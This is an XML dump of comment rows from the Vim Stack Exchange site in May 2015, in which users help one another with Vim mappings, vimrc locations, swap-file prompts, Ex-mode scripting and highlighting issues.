  <row Id="4497" PostId="3203" Score="1" Text="If your cursor is on a fold, pressing `l` will open it.  I don't think the leader key does anything in this case." CreationDate="2015-05-08T13:09:35.937" UserId="865" />
  <row Id="4498" PostId="3203" Score="3" Text="Check the mapping by using `:verbose &lt;leader&gt;l` to see if there is a map." CreationDate="2015-05-08T13:18:48.843" UserId="895" />
  <row Id="4499" PostId="3198" Score="1" Text="You can switch to another window from the cmdline window if you have executed a `:wincmd` before. It will then be in your cmdline history and you can execute it from there, like `:wincmd p&lt;CR&gt;q:k&lt;CR&gt;`. This also closes the cmdline window, however, so it's not very useful. But it should be possible to save the cursor position when leaving the cmdline window and so one can close it, do something else, and resume working with the cmdline history in the same place." CreationDate="2015-05-08T14:27:55.967" UserId="1306" />
  <row Id="4500" PostId="3205" Score="1" Text="I'm guessing your &quot;home&quot; directory is different between the two (gvim vs CLI Vim). Try executing the following in each and see how it compares: `:echo $MYVIMRC`" CreationDate="2015-05-08T17:00:07.613" UserId="227" />
  <row Id="4501" PostId="3205" Score="1" Text="That was one of my first suspicions as well, so I'm afraid I've tried that already with identical results for both. :(" CreationDate="2015-05-08T17:05:25.493" UserId="2030" />
  <row Id="4502" PostId="3205" Score="1" Text="And when editing the vimrc, does `:echo expand('%:p')` show the same thing in each as well?" CreationDate="2015-05-08T17:14:57.823" UserId="227" />
  <row Id="4503" PostId="3205" Score="0" Text="It does indeed." CreationDate="2015-05-08T17:27:58.197" UserId="2030" />
  <row Id="4504" PostId="3194" Score="0" Text="You can set the mtime of a file with the `touch` command. For example: `touch Makefile`. You combine this with `find` to run this on a large number of files: `find /path/to/vim/sources -exec touch {} +`" CreationDate="2015-05-08T17:53:52.363" UserId="51" />
  <row Id="4505" PostId="3205" Score="0" Text="Wow. Then I'm inclined to say that vim truly thinks it is editing the same file, which is backed up by your extra info about copying the file. Might be a feature in Windows. The folks at Super User might be able to shed more light on this. Let us know if you're interested in migrating this." CreationDate="2015-05-08T18:03:54.413" UserId="227" />
  <row Id="4506" PostId="3205" Score="0" Text="One other thought: You aren't running the command line in some compatibility mode, are you? I read somewhere that compatibility mode can redirect some file paths." CreationDate="2015-05-08T18:07:27.287" UserId="227" />
  <row Id="4507" PostId="1981" Score="0" Text="If you are using **MacVim** then you can hit `Cmd-A` to select all the text, then `Cmd-V` to paste over it. The same might work for GVim on **Windows**, using `Ctrl` instead of `Cmd`." CreationDate="2015-05-08T19:14:24.243" UserId="630" />
  <row Id="4508" PostId="2870" Score="0" Text="`&lt;Ctrl-L&gt;` is a quick way to force a redraw." CreationDate="2015-05-08T19:21:52.773" UserId="630" />
  <row Id="4509" PostId="3209" Score="0" Text="Thanks for suggestion, I've asked [another question](http://vi.stackexchange.com/q/3211/467) to address that if that's ok, so if you like, you could elaborate further how to uncompress such files with some specific example." CreationDate="2015-05-08T19:48:36.407" UserId="467" />
  <row Id="4510" PostId="3207" Score="0" Text="Thanks for suggestions. For gzip uncompression I've added [another one](http://vi.stackexchange.com/q/3211/467), so to it'd be more clearer I think." CreationDate="2015-05-08T19:52:46.450" UserId="467" />
  <row Id="4511" PostId="3207" Score="0" Text="It looks like the `-i` flag is not specified by POSIX for the `file(1)` command. In [Linux and OpenBSD, it's `-i` (lowercase)](http://www.openbsd.org/cgi-bin/man.cgi/OpenBSD-current/man1/file.1?query=file&amp;sec=1), but in [OS X, it's `-I` (capital)](https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/file.1.html). Both versions accept the long form `--mime`, though." CreationDate="2015-05-08T20:03:57.240" UserId="24" />
  <row Id="4512" PostId="3207" Score="0" Text="`text/html` files would get classified incorrectly." CreationDate="2015-05-08T20:04:33.623" UserId="24" />
  <row Id="4513" PostId="3211" Score="1" Text="Add `--compressed` to `curl` :-)" CreationDate="2015-05-08T20:18:13.377" UserId="51" />
  <row Id="4514" PostId="3211" Score="0" Text="@Carpetsmoker Good idea, but actually my original script uses `wget` to support partially-downloaded files (which curl doesn't), but on the other hand `wget` doesn't seems to support decompression. I've [tested this](http://unix.stackexchange.com/q/68117/21471), but it didn't work for me." CreationDate="2015-05-08T20:21:39.277" UserId="467" />
  <row Id="4515" PostId="3215" Score="0" Text="You don't need `.\{-}` here, `.*` would match the same thing. In both cases the last fragment that's surrounded by double quotes is retained." CreationDate="2015-05-08T21:01:43.580" UserId="8" />
  <row Id="4516" PostId="3214" Score="0" Text="Do you have something like `set rtp^=~/.vim/bundle/ctrlp.vim/` in your vimrc? If so remove it" CreationDate="2015-05-08T21:21:57.783" UserId="46" />
  <row Id="4517" PostId="2150" Score="0" Text="@Carpetsmoker I agree. It would be nice to do that if it was possible. As it happens this has worked well enough for me for a long time. YMMV." CreationDate="2015-05-08T23:38:20.103" UserId="195" />
  <row Id="4519" PostId="3214" Score="0" Text="Yes, the instructions here: http://kien.github.io/ctrlp.vim say to do so." CreationDate="2015-05-09T03:06:16.313" UserId="301" />
  <row Id="4520" PostId="3218" Score="0" Text="Thanks, I actually used `grep -o '&quot;.*&quot;'` for sake of simplicity." CreationDate="2015-05-09T09:27:49.897" UserId="467" />
  <row Id="4521" PostId="3208" Score="0" Text="I'm still not sure I understand what's going on. Can you elaborate on precisely how this causes opening a file from the context menu, not explicitly as admin (though on the admin account), to be the same as opening it from the command line as admin? Also, if file access is being redirected, I assume I should have another `_vimrc` file somewhere else, with the other contents. Searching for `_vimrc` I found one at `C:\Users\&lt;username&gt;\AppData\Local\VirtualStore\Program Files (x86)\Vim`, so that's probably it, right?" CreationDate="2015-05-09T10:37:53.553" UserId="2030" />
  <row Id="4522" PostId="3205" Score="0" Text="Thanks for the help @JohnO'M. I'm not running the command line in any compatibility mode, but Ingo is probably right with his answer. In retrospect, I shouldn't have edited the `_vimrc` in `%ProgramFiles%` to begin with, but on my previous laptop I had Vim installed on an Ubuntu VM. This is the first time I've installed on Windows. I think I just searched for `vimrc` and edited the only file I found. Evidently this was not the right thing to do. :)" CreationDate="2015-05-09T10:49:18.780" UserId="2030" />
  <row Id="4523" PostId="3208" Score="1" Text="Yes, `VirtualStore`, that's what it's called. I'm not sure about the detailed circumstances; sometimes (opening certain locations), Windows detects that elevation is necessary and does that automatically. I can just say for sure that without elevation, you get redirected." CreationDate="2015-05-09T18:24:02.607" UserId="970" />
  <row Id="4524" PostId="3222" Score="0" Text="This is perfect! It does add a very slight delay on pressing the spacebar (when after a word), but it's not enough to be a big deal, and of course it only happens when spell-check is enabled. For the beep, I made a script that runs `mplayer -really-quiet $SOUNDFILE &gt;/dev/null 2&gt;&amp;1 &amp;` and put that in as the action." CreationDate="2015-05-09T19:39:45.240" UserId="2036" />
  <row Id="4525" PostId="3222" Score="0" Text="Thanks! You could additional add `if &amp;spell &amp;&amp; spellbadword(...)` to disable even the word retrieval in case spell check is off." CreationDate="2015-05-09T19:43:22.147" UserId="970" />
  <row Id="4526" PostId="352" Score="0" Text="ctags approach asked at: http://stackoverflow.com/questions/25742396/creating-ctags-extension-for-markdown" CreationDate="2015-05-09T21:32:28.867" UserId="2038" />
  <row Id="4527" PostId="9" Score="0" Text="When you have read the documentation that @derobert points to, you may find [Jarrod Taylor's demo](https://www.youtube.com/watch?v=vMAeYp8mX_M) of writing python plugins helpful. He also hosts a &quot;plugin starter kit&quot; at [his github](https://github.com/JarrodCTaylor). I don't use it, but I found reading the code and the project wiki pages to be instructive." CreationDate="2015-05-10T11:34:59.773" UserId="1306" />
  <row Id="4528" PostId="3221" Score="0" Text="The question itself aside, do you really want to get your typing interrupted to fix a word? Wouldn't you be faster if you complete the writing first, then go through the errors, for example with a &quot;jump to next misspelled word&quot; command?" CreationDate="2015-05-11T08:32:24.100" UserId="850" />
  <row Id="4529" PostId="3221" Score="0" Text="My motivation goes more like this: the way I usually type, I can tell when I've clearly typed a word correctly, but sometimes I type a word and know that I fumbled it a little bit, but there's still a chance that I got it right. If it doesn't beep, then I know I got it right and I can go on without worrying about it; otherwise, I ^W over it and try again.&#xA;&#xA;This is a perfectly fair question, though – it's probably worth timing a few different approaches and seeing what happens." CreationDate="2015-05-11T14:28:43.010" UserId="2036" />
  <row Id="4530" PostId="3221" Score="0" Text="Ok, the way you do it, it would probably be more efficient. If the beep &quot;made you look&quot;, that would have probably slowed you down, but if you respond to a beep with an automatic ^W, without even looking at the screen, that should be as fast. Just be careful though, if your brain perceives the audible beep after you have started typing the next word, ^W would delete the wrong word. In such a case, you may even think of throwing away all inserted characters after a beep until ^W is pressed, so you can safely know that ^W deleted the misspelled word and you have to continue from there." CreationDate="2015-05-11T14:37:21.277" UserId="850" />
  <row Id="4531" PostId="3225" Score="10" Text="It depends in what environment you're working. Most text terminals send the same information to the application when you press `Esc` or `C-[`, so you're out of luck, but you may be able to do something with a GUI version of Vim or by reconfiguring your terminal." CreationDate="2015-05-11T20:35:02.887" UserId="8" />
  <row Id="4532" PostId="3225" Score="0" Text="Right! Not a vim issue. I'll find a workaround with the keyboard mappings. Thanks" CreationDate="2015-05-11T20:49:20.970" UserId="2022" />
  <row Id="4533" PostId="3227" Score="2" Text="Does `:help swap-exists-choices` answer your question?" CreationDate="2015-05-12T03:27:09.357" UserId="46" />
  <row Id="4534" PostId="3227" Score="0" Text="@FDinoff it helps, but I'm not quite clear on &quot;Abort&quot; still. &quot;also abort further commands.  This is useful when loading a script that edits several files&quot; - Are the &quot;further commands&quot; supposed to be from a vim script? Is it really common enough for a vim script to open new buffers that this is a concern?" CreationDate="2015-05-12T03:44:19.207" UserId="9" />
  <row Id="4535" PostId="3228" Score="3" Text="Try the plugin's issue tracker." CreationDate="2015-05-12T06:57:06.523" UserId="54" />
  <row Id="4536" PostId="3228" Score="0" Text="This looks like a bug." CreationDate="2015-05-12T07:00:41.987" UserId="1577" />
  <row Id="4537" PostId="3226" Score="0" Text="Look for changes in the `termcap` / `terminfo` database rather than in your plugins.  Vim has an, err, interesting way of hardcoding some key bindings while reading others from `termcap` / `terminfo`." CreationDate="2015-05-12T07:16:57.797" UserId="1577" />
  <row Id="4538" PostId="3232" Score="1" Text="Bonus points for mentioning &lt;C-o&gt;, I'm underusing that." CreationDate="2015-05-12T11:37:32.983" UserId="1296" />
  <row Id="4539" PostId="3231" Score="0" Text="possible duplicate of [How can I use a line number to copy a line to where my cursor is?](http://vi.stackexchange.com/questions/3055/how-can-i-use-a-line-number-to-copy-a-line-to-where-my-cursor-is)" CreationDate="2015-05-12T13:26:50.083" UserId="895" />
  <row Id="4542" PostId="3229" Score="0" Text="So is there only a difference when opening in tabs or split windows (`-p`/`-o`/`-O`)? Just using `vim file1 file2` exits entirely on both quit and abort when file1 is being edited; and when file2 is being edited, the prompt doesn't appear until hitting next, and in that case both quit and abort just drop back to file1." CreationDate="2015-05-12T17:46:00.663" UserId="9" />
  <row Id="4543" PostId="3229" Score="1" Text="You don't understand.  Opening files is essentially a sequence of commands.  `vim file1 file2` does two things: it sets the arguments (the thing you can access with `argv()`), and it loads the _first_ file in the buffer.  The second file is actually loaded only when you run `:n` (or similar).  When Vim prompts you the arguments have already been set, so if you `Quit` at that point there is no &quot;further&quot; command left to run.  Also, other things count as commands too, f.i. `autocmd`s and commands set with `vim -c`.  You should think all this in terms of commands, not in terms of affected files." CreationDate="2015-05-12T18:23:50.357" UserId="1577" />
  <row Id="4544" PostId="3232" Score="6" Text="It's also worth mentioning that you can abbreviate `:4yank` with `:4y`" CreationDate="2015-05-12T18:44:43.257" UserId="2057" />
  <row Id="4547" PostId="3226" Score="2" Text="If you type `:help` and then a function key, does it insert something like `&lt;F1&gt;`? What if you start vim with `vim -u /dev/null`? What terminal emulator are you using?" CreationDate="2015-05-12T22:04:56.610" UserId="8" />
  <row Id="4548" PostId="3253" Score="1" Text="I remember seeing a related comment here: https://github.com/tpope/vim-pathogen/issues/102#issuecomment-45413916. Maybe you can just use the InsertLeave autocommand instead of that mapping?" CreationDate="2015-05-13T02:53:14.823" UserId="246" />
  <row Id="4549" PostId="3253" Score="1" Text="vim communicates the the terminal using escape sequences. Mapping escape breaks those escape sequences. Solution. Don't map escape." CreationDate="2015-05-13T05:18:44.047" UserId="46" />
  <row Id="4551" PostId="3246" Score="2" Text="The part about putting it into a named register with &quot;ay4 doesn't look right.  If you do that, vim will be waiting for you to say &quot;4 whats?&quot;.  E.g. if you then hit Enter it will yank 4 lines starting at the current position, if you type /foo&lt;Enter&gt; it will yank til the 4th following occurrance of &quot;foo&quot;, etc." CreationDate="2015-05-13T05:34:15.800" UserId="2065" />
  <row Id="4552" PostId="3258" Score="0" Text="I feel like `{0:'Off', 1:'On'}[&amp;hlsearch]` reads better than `strpart`" CreationDate="2015-05-13T05:41:08.397" UserId="46" />
  <row Id="4553" PostId="3258" Score="0" Text="Although you do realize that `nohlsearch` does something different from `set nohlsearch`?" CreationDate="2015-05-13T05:44:43.683" UserId="46" />
  <row Id="4554" PostId="3258" Score="0" Text="@FDinoff: To be honest, I copied that part from somewhere else many years ago, without giving it much though.  But you're right, of course; I'll edit my answer." CreationDate="2015-05-13T05:47:37.877" UserId="1577" />
  <row Id="4555" PostId="3258" Score="0" Text="@FDinoff: _&quot;`nohlsearch` does something different from `set nohlsearch`&quot;_ - Yes, but I think toggling `hlsearch` is far more useful." CreationDate="2015-05-13T05:51:00.953" UserId="1577" />
  <row Id="4556" PostId="3246" Score="0" Text="The last command should read `4G&quot;ayy`." CreationDate="2015-05-13T08:13:02.457" UserId="54" />
  <row Id="4557" PostId="3260" Score="0" Text="Thank you. I'll play with folding a bit and see how useful that is. I'll go over the help section for signs, I didn't read that yet as I thought that the term signs refers only to Chris's plugin, not a native feature." CreationDate="2015-05-13T08:45:32.643" UserId="989" />
  <row Id="4558" PostId="3262" Score="3" Text="You can also use [``set noesckeys``](http://vimhelp.appspot.com/options.txt.html#%27noek%27); this has the side effect of disabling the arrow keys (and perhaps some other keys?) in Insert mode though, so it may not be for everyone." CreationDate="2015-05-13T15:25:57.610" UserId="51" />
  <row Id="4560" PostId="2463" Score="1" Text="This variant will also work correctly for visual mode: `noremap &lt;expr&gt; gM (virtcol('$') / 2) . '&lt;Bar&gt;'`" CreationDate="2015-05-13T18:16:55.327" UserId="970" />
  <row Id="4561" PostId="3263" Score="0" Text="This is absolutely terrific. I have been toying around with getting the function name in the statusbar for years, with varying levels of success. This post answers all the questions that I had and resolved all the issues that I had. I can't accept it as the answer because it does not address the question, so I'll go ask that question in a new thread. Thank you!" CreationDate="2015-05-13T18:32:23.830" UserId="989" />
  <row Id="4563" PostId="3263" Score="0" Text="[Here](http://vi.stackexchange.com/questions/3266/display-name-of-current-method-in-php-files) is a good place to answer this answer, so that I could accept it. Thanks." CreationDate="2015-05-13T18:38:12.190" UserId="989" />
  <row Id="4564" PostId="3267" Score="0" Text="The example you give should work, is there something more specific you are having a problem with?" CreationDate="2015-05-13T19:28:56.560" UserId="895" />
  <row Id="4565" PostId="3267" Score="0" Text="Your given command replaces with `time` (the other way around). Please add exact expected results, and a description of what exactly you're struggling with!" CreationDate="2015-05-13T19:52:22.933" UserId="970" />
  <row Id="4566" PostId="3267" Score="0" Text="Say for example the file had:&#xA;`Time: 60 minutes&#xA;Seconds: 3600&#xA;Milliseconds: 36000`&#xA;&#xA;What am looking for is after the replace,&#xA;`Time: 60 minutes&#xA;Time: 3600&#xA;MilliTime: 36000`&#xA;&#xA;Basically, I would like to know how I can be more specific about only replacing lines that have Seconds in the string, and avoiding the others if there were more than just these 3 lines." CreationDate="2015-05-13T19:53:49.187" UserId="2077" />
  <row Id="4567" PostId="3267" Score="0" Text="Read `:help :range`; it has all the details on how to be more specific than the global `:%` range." CreationDate="2015-05-13T20:14:54.073" UserId="970" />
  <row Id="4568" PostId="3262" Score="1" Text="@Carpetsmoker Regarding &quot;set noesckeys&quot;... that works, but only if in Insert mode.  I know I said I was in Insert mode to begin with; however I also often do &lt;Esc&gt;O starting from Normal mode (mainly when I'm not 100% sure whether I'm starting in Insert or Normal mode) so I'd like something that works in that case too." CreationDate="2015-05-13T20:53:40.927" UserId="2065" />
  <row Id="4572" PostId="3263" Score="2" Text="@dotancohen Thanks :-) I'm not sure of a new question is really required; your &quot;core problem&quot; description reads *&quot;I need another way of determining when I've `n`ed into another function.&quot;*, which is what this answer tries to solve, although It does this in a rather different way than you asked for, but that's because I think what you're asking for is not possible (could be wrong, of course) ..." CreationDate="2015-05-13T22:18:53.960" UserId="51" />
  <row Id="4573" PostId="3262" Score="1" Text="@DonHatch You can use `:nnoremap ^[O O`, where `^[` is entered by pressing `&lt;C-v&gt;&lt;Esc&gt;` (may also show up as `&lt;1b&gt;`)." CreationDate="2015-05-13T22:30:20.017" UserId="51" />
  <row Id="4574" PostId="3270" Score="0" Text="Weirdly, from the comment: &quot;What am looking for is after the replace, Time: 60 minutes Time: 3600 MilliTime: 36000&quot;." CreationDate="2015-05-13T23:21:34.627" UserId="205" />
  <row Id="4576" PostId="3272" Score="0" Text="Note that I do not wish to use abbreviations or mappings, since these will replace the text." CreationDate="2015-05-14T07:20:38.750" UserId="2082" />
  <row Id="4579" PostId="3273" Score="1" Text="A session saved with `:mksession` is a *whole* session. If there was a way to load a session into an active session it would replace existing buffers and do all kinds of things that would mess it up. Sessions are only meant to be used with the `-S` argument at startup." CreationDate="2015-05-14T10:00:55.087" UserId="54" />
  <row Id="4581" PostId="3273" Score="0" Text="@romainl ah thats a shame.  Is there any other method of storing a list of open files?  That's the main thing I'm interested in" CreationDate="2015-05-14T11:04:27.353" UserId="1518" />
  <row Id="4582" PostId="3271" Score="0" Text="It's looking like you are trying install plugin via pathogen, but you don't have one. Does other 3rd party plugins work for you?" CreationDate="2015-05-14T13:26:08.317" UserId="500" />
  <row Id="4583" PostId="3272" Score="0" Text="I presume you're deliberately using `&lt;C-\&gt;&lt;C-N&gt;` instead of &lt;Esc&gt; because you don't like the beep? Also, surely an nmap means you'll already be in normal mode? Is that just a typo, or am I missing something?" CreationDate="2015-05-14T15:34:52.103" UserId="343" />
  <row Id="4584" PostId="3271" Score="0" Text="None of the plugins work....what is the problem" CreationDate="2015-05-14T15:40:57.800" UserId="2086" />
  <row Id="4585" PostId="3271" Score="0" Text="I'd recommend you to reinstall vim, because your file hierarchy kind of messy maybe something went wrong when you tried to solve this issue. After reinstaling vim install pathogen plugin, and after it just put emmet in the pathogen's bundle directory. It should work." CreationDate="2015-05-14T16:42:13.487" UserId="500" />
  <row Id="4586" PostId="1917" Score="0" Text="In step 3. you can move faster using object motions. For example can use `}` to select entire paragraph or `)` for sentences. There are more, you can read about them in `:h object-motions`" CreationDate="2015-05-14T18:55:51.677" UserId="2022" />
  <row Id="4587" PostId="1917" Score="0" Text="Also searching for a substring with `/something&lt;CR&gt;` is a very efficient method to reach to the end of your selection block" CreationDate="2015-05-14T18:59:54.840" UserId="2022" />
  <row Id="4588" PostId="3280" Score="0" Text="In my case (on OS X) `vim -E http://example.com/` works as expected (it's populated) and `/&lt;head&gt;` also works (as you've shown), but the main problem is that it doesn't work when everything is in one line. Just run: `:%j` before doing search and you'll see." CreationDate="2015-05-14T19:28:10.750" UserId="467" />
  <row Id="4589" PostId="3280" Score="1" Text="I forgot the trailing slash. Ex is line-based: if everything is on one single line that mode is near useless and there is no &quot;cursor&quot; to place on `&lt;head&gt;` anyway." CreationDate="2015-05-14T19:39:44.683" UserId="54" />
  <row Id="4590" PostId="3280" Score="0" Text="It's not useless, as I'm require this for my script which is to find the tag and remove the content of the inner tag (e.g.  `/&lt;head` and `norm vitd`) from the file, but it's another story. So finding pattern and placing the cursor on the tag is the key, but unfortunately my html code for parsing doesn't have much new lines, that's why it's failing." CreationDate="2015-05-14T19:44:34.767" UserId="467" />
  <row Id="4591" PostId="3280" Score="0" Text="You actually can place the cursor on `&lt;head&gt;` in Ex mode, as I've shown in my other answer. You can see cursor moving when going back to `visual` mode when executing motion movements, so its position changes (by jumping to the next match: `norm n`)." CreationDate="2015-05-14T19:50:42.127" UserId="467" />
  <row Id="4592" PostId="3282" Score="0" Text="Interesting plugin; I hope you are aware of [the ColorSel plugin](http://www.vim.org/scripts/script.php?script_id=927), which also implements a (generic) color selector." CreationDate="2015-05-14T19:54:09.757" UserId="970" />
  <row Id="4593" PostId="3284" Score="0" Text="*Right* after I committed a solution using a gross loop to scan manually. :D Thanks!" CreationDate="2015-05-14T19:56:11.890" UserId="72" />
  <row Id="4594" PostId="3282" Score="0" Text="Not seen that one, but I know there's quite a few. Thanks for pointing it out. Mostly I write these for my own edification, I find that they teach me interesting things about vim." CreationDate="2015-05-14T19:57:31.360" UserId="72" />
  <row Id="4596" PostId="403" Score="1" Text="Maybe not an official term, but I've heard the word *chord* used to describe key sequences with `Ctrl`." CreationDate="2015-05-15T03:48:55.073" UserId="64" />
  <row Id="4597" PostId="3285" Score="4" Text="Can you clarify your question further more, please? By specifying some sample input and expected outcome?" CreationDate="2015-05-15T11:34:51.120" UserId="467" />
  <row Id="4598" PostId="3288" Score="0" Text="The &quot;whatever&quot; reason is that you are supposed to leave the second line of your git commit blank. That is the preferred style with git commits: 1 short line (~60 characters) describing the commit, followed by a blank line, followed by an explanation as large as you want/can." CreationDate="2015-05-15T11:34:51.660" UserId="850" />
  <row Id="4599" PostId="3288" Score="0" Text="@Shahbaz: Ok thanks for the explanation, that clears things up. I've only used git casually for some private stuff so far but have never actually learned it (i.e. read a guide or so), so I'm not yet aware of such things. Reading the git book is on my TODO list, though, before starting to use git more extensively." CreationDate="2015-05-15T11:52:23.993" UserId="2100" />
  <row Id="4600" PostId="3288" Score="0" Text="Git is awesome and can do things beyond your imagination, yet is very simple for everyday use. Happy learning!" CreationDate="2015-05-15T12:21:14.213" UserId="850" />
  <row Id="4601" PostId="3289" Score="0" Text="Thanks for your answer. But do I understand it correctly that your suggested solutions/workarounds are to change the syntax files (i.e. to specify that a specific highlighting should have precedence to the colorline highlighting)? If so, that's not what I'm looking for, what I'd like to specify is for the colorline highlighting to be placed behind any syntax highlighting. In that case, I'll just have to accept the way it works, i.e. that syntax highlighting is always overridden by the colorline highlighting." CreationDate="2015-05-15T12:22:22.313" UserId="2100" />
  <row Id="4602" PostId="3289" Score="0" Text="Syntax files usually don't define colors, they just `:hi link` to existing groups (like `Todo`). My workaround would have you change your personal colorscheme, either directly or in your `.vimrc`." CreationDate="2015-05-15T12:57:59.587" UserId="970" />
  <row Id="4603" PostId="3285" Score="0" Text="@kenorb It was just a Q&amp;A thing that I wanted to post, I just thought to myself that really there are several ways to accomplish something very simple and wanted to share them here (since Vi is now off-topic on SuperUser and SO). I'll edit the question a bit better to reflect that. And I wanted to narrow it down a bit further to avoid the replace-mode way." CreationDate="2015-05-15T13:20:20.537" UserId="662" />
  <row Id="4604" PostId="3292" Score="0" Text="sadly, there is no way to limit the range of [(, as i am looking for unclosed parenthesis in the range of one line, updated my question to make more obvious." CreationDate="2015-05-15T13:51:54.967" UserId="2056" />
  <row Id="4605" PostId="3294" Score="0" Text="indeed, not an easy job." CreationDate="2015-05-15T14:37:00.480" UserId="2056" />
  <row Id="4606" PostId="3285" Score="0" Text="It's ok to post, but the thing is that you don't give enough details/explanation within the question, so people won't understand what's the answer about if they don't understand what was the problem in the first place, in other words you're not allowing other users to post alternative solutions, because the problem isn't clarified enough. E.g. 'a specific number of characters' and 'through the INSERT mode' is ambiguous. Just giving some sample text example (in and out) would be great." CreationDate="2015-05-15T15:43:12.703" UserId="467" />
  <row Id="4607" PostId="3286" Score="2" Text="The question asks: 'through the INSERT mode', but when you type `5s` then you type it literally. If you don't mean in INSERT mode, then you've to press Escape first to exit this mode, unless you was thinking about COMMAND mode. That's why isn't clear for me." CreationDate="2015-05-15T15:45:17.403" UserId="467" />
  <row Id="4608" PostId="3285" Score="0" Text="@kenorb I understand, not sure how to edit it better, I just wanted to post a Q&amp;A about ways to change characters that don't include replace mode (as I believe that's already covered)." CreationDate="2015-05-15T15:47:40.287" UserId="662" />
  <row Id="4609" PostId="3297" Score="5" Text="And you can use `:echo indent('.') / &amp;shiftwidth` to get the indent width of the current line (that's what `.` refers to) divided by the `shiftwidth` to get the indentation level." CreationDate="2015-05-15T16:09:06.760" UserId="51" />
  <row Id="4610" PostId="3295" Score="0" Text="Thanks! It's actually what I wanted. By the way I already found this facility in https://github.com/jeetsukumaran/vim-buffergator plugin, but for me it's just overkill to use this plugin only for 2 commands, maybe if I need more comprehensive tool for bufer managment, but not now." CreationDate="2015-05-15T16:45:23.063" UserId="500" />
  <row Id="4611" PostId="3289" Score="0" Text="Ok yes sure, at second thought that's more or less what I meant. Still, I'd have to change the behaviour of specific highlightings in order to override that of cursorline, rather than changing the behaviour of cursorline to be overridden by any highlightings (which apparently isn't possible). So for now I'll just (have to) accept fate, but your workaround might come in handy if there are a few specific highlightings that often annoy me, and which I could then fix selectively." CreationDate="2015-05-15T17:02:12.813" UserId="2100" />
  <row Id="4612" PostId="3302" Score="0" Text="I've added `n`, because I'm confused when Vim set the cursor on matched pattern and when it's not. I guess in Ex mode it doesn't set cursor properly on the pattern (it seems so, because the tag is at the beginning of the line), but when it is in the middle, it won't work. So I think the `n` is necessary to make this works for these both cases. See: [this](http://vi.stackexchange.com/q/3276/467) for more details." CreationDate="2015-05-16T10:44:01.523" UserId="467" />
  <row Id="4613" PostId="3303" Score="0" Text="The logging didn't help much, but after starting it without plugins and then editing the vimrc (it created a new one - so I guess it was missing) the next time it started up fine. Thanks" CreationDate="2015-05-16T10:52:21.547" UserId="460" />
  <row Id="4614" PostId="3302" Score="0" Text="Why do you use Ex mode at all (with all its complications)? To automate Vim, see http://stackoverflow.com/a/23237529/813602 for possibilities." CreationDate="2015-05-16T10:56:53.720" UserId="970" />
  <row Id="4615" PostId="3302" Score="0" Text="I'm using `ex` to make and look it simple as part of the script and I'm learning it at the same time. Secondly it's distributed widely by default (opposite to vim). The other thing is that I can always add silent (`-s`), so the screen doesn't blink when I run the script and I can also deal with stdin and stdout easily. I know I can use `vi` instead of `vim`, but on OSX it's linked to `vim` by default, so it's the same thing (so I can't check the compatibility of my changes with plain `vi`), that's why the easiest way for me is to use `ex`, so it's cross-platform compatible." CreationDate="2015-05-16T11:06:27.460" UserId="467" />
  <row Id="4616" PostId="3302" Score="0" Text="But the cursor issue for search patterns is not `ex` specific thing, the same happens in Vim Ex-mode that the cursor isn't set properly, so you've to still use `n` (when the string is somewhere in the middle of the line). Unless you've some better idea." CreationDate="2015-05-16T11:19:02.100" UserId="467" />
  <row Id="4617" PostId="3304" Score="0" Text="Great. I came to the same conclusion after my confusion, because Vim wasn't actually showing me this new line, but it was there after save." CreationDate="2015-05-16T11:33:49.133" UserId="467" />
  <row Id="4618" PostId="3304" Score="1" Text="@kenorb by the way you can show all EOL charachters using this comand `:set listchars=eol:$`" CreationDate="2015-05-16T11:41:13.713" UserId="500" />
  <row Id="4619" PostId="3263" Score="0" Text="Accepted for resolving the _issue_. Thanks!" CreationDate="2015-05-16T13:55:32.040" UserId="989" />
  <row Id="4620" PostId="3309" Score="1" Text="Also note that `2g_` will also work if you want to go to the last non whitespace character on the next line.  However, this can't be used for the previous line.  The advantage of `2g_` is that it can be repeated with `.`" CreationDate="2015-05-17T13:27:05.350" UserId="865" />
  <row Id="4621" PostId="3307" Score="0" Text="I don't think there is any way of doing this by default, but you could probably create a plugin which does." CreationDate="2015-05-17T13:29:39.827" UserId="865" />
  <row Id="4622" PostId="3309" Score="1" Text="Motions (like `g_`) are not repeatable with `.`. Generally, only things that change the state of the buffer can be repeated." CreationDate="2015-05-17T22:01:50.517" UserId="64" />
  <row Id="4623" PostId="3309" Score="0" Text="Though, when combined with an operator, repeating works. Perhaps that's what you were referring to" CreationDate="2015-05-17T22:04:15.423" UserId="64" />
  <row Id="4624" PostId="3309" Score="0" Text="Ah, I didn't realize motions weren't repeatable.  I should look at the docs before I say things." CreationDate="2015-05-18T00:13:07.317" UserId="865" />
  <row Id="4625" PostId="3317" Score="1" Text="`gvim -u NONE -U NONE` has it working fine, so I must just have a plugin doing something weird." CreationDate="2015-05-18T05:44:23.607" UserId="488" />
  <row Id="4626" PostId="3318" Score="0" Text="Doing some testing, using a vimrc with only `set wildignore=*.png,` isn't enough to cause this, so maybe parsing gets stuck with any trailing comma?" CreationDate="2015-05-18T06:11:44.893" UserId="488" />
  <row Id="4628" PostId="3318" Score="0" Text="We'll see if it really is a bug https://code.google.com/p/vim/issues/detail?id=365" CreationDate="2015-05-18T06:41:27.763" UserId="488" />
  <row Id="4629" PostId="3321" Score="0" Text="Thanks a lot for your tips (I'll also check your plugin)! Your answer leads me to another question (I don't know if I should create a new one or ask it here): let's say I want to map `P` to call `setreg()` and then put but only when I made a block selection is there a way to create such a mapping? I can't create it only in visual mode because it is not relevant and create it in normal mode would override `P` each time which is not what I want neither." CreationDate="2015-05-18T12:00:27.893" UserId="1841" />
  <row Id="4630" PostId="3321" Score="0" Text="You can use `getregtype()` to check whether the register contains a blockwise selection. But in my opinion, blockwise paste can be useful, too, so I would recommend a separate mapping." CreationDate="2015-05-18T12:31:32.183" UserId="970" />
  <row Id="4631" PostId="3302" Score="0" Text="Using `dit` would be simpler (and faster?) for a batch command." CreationDate="2015-05-18T13:36:07.237" UserId="599" />
  <row Id="4632" PostId="3321" Score="0" Text="Yes I think you're right. Anyway I checked your plugin and I think I will simply use that it is the most convenient. Thanks again for your answers!" CreationDate="2015-05-18T13:38:20.583" UserId="1841" />
  <row Id="4633" PostId="3313" Score="2" Text="aren't we all ? I mean, I cannot efficiently use vim without my own vimrc." CreationDate="2015-05-18T15:21:46.917" UserId="2056" />
